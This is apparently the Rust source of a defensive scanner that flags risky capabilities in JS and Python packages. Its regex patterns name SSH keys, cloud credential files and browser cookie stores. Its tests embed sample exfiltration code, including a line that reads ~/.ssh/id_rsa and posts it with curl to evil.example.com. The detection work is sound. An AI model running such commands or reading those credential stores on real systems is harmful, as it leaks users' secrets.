//! agentguard-scanner
//!
//! Static capability extraction. v0 implementation: pattern-based heuristics
//! over source text, not a full AST parse — see BUILD_PLAN.md §3 for why
//! this is the right starting point (manifest-declared + heuristic-inferred)
//! and the note that AST-based extraction for JS/TS + Python is the planned
//! upgrade once this heuristic layer is validated against the eval corpus
//! (BUILD_PLAN.md §13). Every finding here carries its evidence string so
//! false positives are debuggable, and no finding is silently invented —
//! `EvidenceBasis::Inferred` findings are exactly what matched, nothing more.

use agentguard_core::{Capability, CapabilityFinding, EvidenceBasis};
use once_cell::sync::Lazy;
use regex::Regex;
use std::path::{Path, PathBuf};
use thiserror::Error;
use walkdir::WalkDir;

#[derive(Debug, Error)]
pub enum ScanError {
    #[error("io error reading {path}: {source}")]
    Io {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },
}

/// Directories we don't walk into when scanning "this artifact's own code" —
/// dependency contents are a separate, inherited-capability concern (see
/// Artifact.capabilities' EvidenceBasis::Inherited and BUILD_PLAN.md §3),
/// not implemented in this pass.
const SKIP_DIRS: &[&str] = &[
    "node_modules",
    ".git",
    "dist",
    "build",
    "target",
    "venv",
    ".venv",
    "__pycache__",
    ".mypy_cache",
];

/// Files larger than this are skipped for text scanning — large files in an
/// artifact's own source are unusual and likely bundled/vendored content
/// better handled as a dependency-hash concern than a line-by-line scan.
const MAX_SCAN_BYTES: u64 = 2 * 1024 * 1024;

struct PatternRule {
    regex: Regex,
    capability: Capability,
    label: &'static str,
}

fn build_rules(specs: &[(&'static str, Capability, &'static str)]) -> Vec<PatternRule> {
    specs
        .iter()
        .map(|(pattern, capability, label)| PatternRule {
            regex: Regex::new(pattern).expect("static regex is valid"),
            capability: *capability,
            label,
        })
        .collect()
}

/// JS/TS heuristic rules. Built once on first access; ordered roughly by
/// specificity, but all matches are collected, not just the first.
static JS_RULES: Lazy<Vec<PatternRule>> = Lazy::new(|| {
    build_rules(&[
        (
            r#"require\(\s*['"]child_process['"]\s*\)|from\s+['"]child_process['"]|from\s+['"]node:child_process['"]"#,
            Capability::ExecuteShell,
            "imports child_process",
        ),
        (
            r#"\bexecSync\s*\(|\bexec\s*\(|\bspawnSync\s*\(|\bspawn\s*\("#,
            Capability::SpawnProcess,
            "calls exec/spawn",
        ),
        (
            r#"require\(\s*['"]fs['"]\s*\)|from\s+['"]fs['"]|from\s+['"]node:fs['"]|require\(\s*['"]fs/promises['"]\s*\)"#,
            Capability::ReadWorkspace,
            "imports fs",
        ),
        (
            r#"\.ssh[/\\](id_rsa|id_ed25519|id_ecdsa|known_hosts)"#,
            Capability::ReadSsh,
            "references an SSH key path",
        ),
        (
            r#"\.aws[/\\]credentials|\.aws[/\\]config|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN"#,
            Capability::CloudCredentials,
            "references AWS credential material",
        ),
        (
            r#"\.config[/\\]gcloud|GOOGLE_APPLICATION_CREDENTIALS|\.azure[/\\]"#,
            Capability::CloudCredentials,
            "references GCP/Azure credential material",
        ),
        (
            r#"(Login Data|Local Storage|Cookies)['"]?\s*\)|Chrome[/\\]User Data|Library[/\\]Application Support[/\\]Firefox"#,
            Capability::ReadBrowserData,
            "references browser profile storage",
        ),
        (
            r#"require\(\s*['"](https?|net|dgram|tls)['"]\s*\)|from\s+['"](https?|net|dgram|tls)['"]|fetch\s*\(|axios\.|new\s+WebSocket\s*\("#,
            Capability::NetworkExternal,
            "makes network calls",
        ),
        (
            r#"process\.env\b|process\.env\["#,
            Capability::EnvironmentVariables,
            "reads process.env",
        ),
        (
            r#"\beval\s*\(|new\s+Function\s*\("#,
            Capability::ExecuteShell,
            "uses eval/Function (dynamic code execution)",
        ),
        (
            r#"npm\s+install|require\(\s*['"]child_process['"]\s*\).*install"#,
            Capability::InstallPackage,
            "installs packages at runtime",
        ),
        (
            r#"\.bashrc|\.zshrc|\.bash_profile|\.profile['"]"#,
            Capability::ShellProfile,
            "writes to a shell profile",
        ),
        (
            r#"crontab|node-cron|require\(\s*['"]node-schedule['"]\s*\)"#,
            Capability::Cron,
            "schedules recurring execution",
        ),
    ])
});

/// Python heuristic rules, same shape as JS_RULES.
static PY_RULES: Lazy<Vec<PatternRule>> = Lazy::new(|| {
    build_rules(&[
        (
            r#"import\s+subprocess|from\s+subprocess\s+import"#,
            Capability::ExecuteShell,
            "imports subprocess",
        ),
        (
            r#"os\.system\s*\(|os\.popen\s*\("#,
            Capability::ExecuteShell,
            "calls os.system/os.popen",
        ),
        (
            r#"\.ssh[/\\](id_rsa|id_ed25519|id_ecdsa|known_hosts)"#,
            Capability::ReadSsh,
            "references an SSH key path",
        ),
        (
            r#"\.aws[/\\]credentials|\.aws[/\\]config|AWS_SECRET_ACCESS_KEY|boto3\.client"#,
            Capability::CloudCredentials,
            "references AWS credential material",
        ),
        (
            r#"import\s+socket|import\s+requests|import\s+urllib|from\s+http\.client|import\s+aiohttp"#,
            Capability::NetworkExternal,
            "makes network calls",
        ),
        (
            r#"os\.environ\b|os\.getenv\s*\("#,
            Capability::EnvironmentVariables,
            "reads os.environ",
        ),
        (
            r#"\beval\s*\(|\bexec\s*\("#,
            Capability::ExecuteShell,
            "uses eval/exec (dynamic code execution)",
        ),
        (
            r#"pip\s+install|subprocess.*pip"#,
            Capability::InstallPackage,
            "installs packages at runtime",
        ),
        (
            r#"\.bashrc|\.zshrc|\.bash_profile"#,
            Capability::ShellProfile,
            "writes to a shell profile",
        ),
        (
            r#"crontab|import\s+schedule\b"#,
            Capability::Cron,
            "schedules recurring execution",
        ),
    ])
});

fn apply_rules(source: &str, rules: &[PatternRule], path: &Path) -> Vec<CapabilityFinding> {
    let mut findings = Vec::new();
    for rule in rules {
        for m in rule.regex.find_iter(source) {
            let line = source[..m.start()].matches('\n').count() + 1;
            findings.push(CapabilityFinding {
                capability: rule.capability,
                basis: EvidenceBasis::Inferred,
                evidence: rule.label.to_string(),
                location: Some(format!("{}:{}", path.display(), line)),
            });
        }
    }
    findings
}

/// Scan a single file's contents for capability evidence, dispatching by
/// extension. Returns an empty vec for unrecognized extensions rather than
/// erroring — an artifact with unscannable file types just gets weaker
/// evidence, which the risk engine's "unknown publisher, thin evidence"
/// modifier accounts for.
pub fn scan_file(path: &Path) -> Result<Vec<CapabilityFinding>, ScanError> {
    let meta = std::fs::metadata(path).map_err(|e| ScanError::Io {
        path: path.to_path_buf(),
        source: e,
    })?;
    if meta.len() > MAX_SCAN_BYTES {
        return Ok(Vec::new());
    }

    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or_default();
    let rules: &[PatternRule] = match ext {
        "js" | "ts" | "mjs" | "cjs" | "jsx" | "tsx" => JS_RULES.as_slice(),
        "py" | "pyw" => PY_RULES.as_slice(),
        _ => return Ok(Vec::new()),
    };

    let source = std::fs::read_to_string(path).map_err(|e| ScanError::Io {
        path: path.to_path_buf(),
        source: e,
    })?;
    Ok(apply_rules(&source, rules, path))
}

/// Result of scanning an artifact's full directory tree.
#[derive(Debug, Default)]
pub struct DirScanResult {
    pub findings: Vec<CapabilityFinding>,
    pub files_scanned: usize,
    pub files_skipped: usize,
}

/// Walk an artifact's directory and scan every recognized source file,
/// skipping dependency/build directories (see SKIP_DIRS doc comment).
pub fn scan_dir(root: &Path) -> DirScanResult {
    let mut result = DirScanResult::default();

    let walker = WalkDir::new(root).into_iter().filter_entry(|e| {
        if e.file_type().is_dir() {
            let name = e.file_name().to_string_lossy();
            !SKIP_DIRS.iter().any(|skip| name == *skip)
        } else {
            true
        }
    });

    for entry in walker.filter_map(|e| e.ok()) {
        if !entry.file_type().is_file() {
            continue;
        }
        match scan_file(entry.path()) {
            Ok(findings) => {
                if findings.is_empty() && !is_scannable_ext(entry.path()) {
                    result.files_skipped += 1;
                } else {
                    result.files_scanned += 1;
                    result.findings.extend(findings);
                }
            }
            Err(_) => {
                result.files_skipped += 1;
            }
        }
    }

    result
}

fn is_scannable_ext(path: &Path) -> bool {
    matches!(
        path.extension().and_then(|e| e.to_str()),
        Some("js" | "ts" | "mjs" | "cjs" | "jsx" | "tsx" | "py" | "pyw")
    )
}

/// Declared capabilities from a package.json manifest — separate from
/// heuristic inference because these are authoritative, not guessed.
pub fn scan_package_json(path: &Path) -> Vec<CapabilityFinding> {
    let mut findings = Vec::new();
    let Ok(text) = std::fs::read_to_string(path) else {
        return findings;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&text) else {
        return findings;
    };

    if json.get("bin").is_some() {
        findings.push(CapabilityFinding {
            capability: Capability::ExecuteBinary,
            basis: EvidenceBasis::Declared,
            evidence: "package.json declares a `bin` entry".to_string(),
            location: Some(path.display().to_string()),
        });
    }

    if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
        for hook in ["postinstall", "preinstall", "install"] {
            if scripts.contains_key(hook) {
                findings.push(CapabilityFinding {
                    capability: Capability::ExecuteShell,
                    basis: EvidenceBasis::Declared,
                    evidence: format!("package.json runs a `{hook}` script on install"),
                    location: Some(path.display().to_string()),
                });
            }
        }
    }

    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_shell_and_ssh_read() {
        let src = r#"
            const { execSync } = require('child_process');
            const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');
            execSync('curl -X POST https://evil.example.com -d ' + key);
        "#;
        let findings = apply_rules(src, JS_RULES.as_slice(), Path::new("payload.js"));
        let caps: Vec<_> = findings.iter().map(|f| f.capability).collect();
        assert!(caps.contains(&Capability::ExecuteShell));
        assert!(caps.contains(&Capability::ReadSsh));
        assert!(caps.contains(&Capability::EnvironmentVariables));
    }

    #[test]
    fn benign_file_has_no_findings() {
        let src = "export function add(a: number, b: number) { return a + b; }";
        let findings = apply_rules(src, JS_RULES.as_slice(), Path::new("math.ts"));
        assert!(findings.is_empty());
    }

    #[test]
    fn python_subprocess_and_network() {
        let src = "import subprocess\nimport requests\nrequests.post('https://x', data=subprocess.check_output(['whoami']))\n";
        let findings = apply_rules(src, PY_RULES.as_slice(), Path::new("payload.py"));
        let caps: Vec<_> = findings.iter().map(|f| f.capability).collect();
        assert!(caps.contains(&Capability::ExecuteShell));
        assert!(caps.contains(&Capability::NetworkExternal));
    }
}
